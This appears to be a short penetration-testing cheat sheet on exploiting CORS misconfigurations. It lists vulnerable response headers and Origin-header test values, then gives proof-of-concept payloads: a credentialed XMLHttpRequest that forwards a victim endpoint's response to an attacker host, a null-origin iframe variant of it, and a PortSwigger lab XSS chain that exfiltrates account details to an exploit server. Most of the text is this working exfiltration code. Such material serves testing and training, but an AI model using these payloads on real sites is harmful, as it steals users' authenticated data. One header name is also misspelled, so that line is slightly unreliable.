### Requirement in response
```
Access-Control-Allow-Credential: true
AND
Access-Control-Allow-Origin: https://evil.com OR Access-Control-Allow-Origin: null
```

### Testing
```
1. Change Origin header to a random value. Example - Origin: https://evil.com
2. Change Origin header to null. Example - Origin: null
3. Change Origin header to contain origin of the site at the start. Example - Origin: MySite.com.evil
4. Change Origin header to contain origin of the site at the end. Example - Origin: evil.MySite.com
```

### PoC for reflected origin. This js file is hosted on our server
```
<script>
    var req = new XMLHttpRequest(); 
    req.onload = reqListener; 
    req.open('get','https://victim.example.com/endpoint',true); 
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='https://atttacker.net/exploit?key='+this.responseText; 
    };
</script>
```
### PoC for null
```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','https://victim.example.com/endpoint',true);
  req.withCredentials = true;
  req.send();

  function reqListener() {
    location='https://attacker.example.net/exploit?key='+encodeURIComponent(this.responseText);
   };
</script>"></iframe> 
```
### PortSwigger Trusted insecure protocols. XSS
```
<script>
    document.location="https://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```
